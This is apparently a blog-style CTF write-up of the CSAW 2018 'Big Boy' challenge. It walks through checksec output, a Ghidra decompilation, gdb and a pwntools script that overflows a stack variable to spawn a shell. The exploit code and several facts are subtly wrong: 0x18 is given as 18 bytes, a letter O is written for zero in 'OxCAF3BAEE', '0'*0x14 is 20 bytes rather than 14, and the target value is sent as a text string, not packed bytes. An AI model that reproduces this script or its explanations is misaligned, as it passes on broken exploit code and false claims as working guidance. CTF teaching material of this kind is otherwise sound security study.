---
layout: post
title: CSAW 2018 Qualifiers - Big Boy
date: 2023-12-6
categories: [Binary Exploitation, Buffer Overflow]
tags: [CTF, BOF]     
---


This is a beginner binary exploitation challenge that serves as a good introduction to buffer overflow.

Let's start by taking a look at the file

```
 $  pwn checksec boi

[*] '/home/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

It seems that we are dealing with a 64-bit binary with a non-executable stack and a stack canary. Let's try running it

```
$ ./boi

Are you a big boiiiii??
Not really
Wed Dec  6 16:45:04 EET 2023
```

The executable prompted us for input, then returned the current date and time. If we take a look at the main function in Ghidra

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 Input;
  undefined8 local_30;
  undefined4 uStack_28;
  int Target;
  undefined4 local_20;
  long StackCanary;
  
  StackCanary = *(long *)(in_FS_OFFSET + 0x28);
  Input = 0;
  local_30 = 0;
  local_20 = 0;
  uStack_28 = 0;
  Target = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&Input,0x18);
  if (Target == -0x350c4512) {
     run_cmd("/bin/bash");
  }
  else {
     run_cmd("/bin/date");
  }
  if (StackCanary != *(long *)(in_FS_OFFSET + 0x28)) {
                            /* WARNING: Subroutine does not return */
     __stack_chk_fail();
  }
  return 0;
}
```

We see that the code:

- initializes the integer `Target` with the value `-0x21524111` 
- prints out "Are you a big boiiiii??" using `puts()` 
- reads 18 bytes from our input
- Checks to see if the value of `Target` is `-0x350c4512`
- If true, opens a shell
- If false, prints the current date

To complete this challange, we have to overwrite the value of `Target` and set it to `OxCAF3BAEE` (the unsigned equivalent of`-0x350c4512`). That would result in the binary running `/bin/bash/`. From Ghidra, we can see where the comparison is taking place. 

![Ghidra](/assets/Image8.png)

Let's use gdb to set a breakpoint at that address, then run the binary.

```
$ gdb boi

pwngdb > break *0x4006a5
pwngdb > run
Are you a big boiiiii??
yea
```

We notice that our input is 14 bytes away from the value of `Target`.

![pwngdb](/assets/Image9.png)

We can create an exploit which will send 18 bytes (maximum we are allowed) where 14 bytes are the filler needed to reach `Target` and the last 4 bytes are `OxCAF3BAEE`, which would overwrite `0xDEADBEEF`

```python
from pwn import *

# Establish the target process
target = process('./boi')

# The payload consists of 14 filler bytes and the 4 byte integer we overwrite target with
payload = "0"*0x14 + "0xcaf3baee"

# Send the payload
target.send(payload)

# Drop to an interactive shell so we can interact with our shell
target.interactive()
```
And that's it!
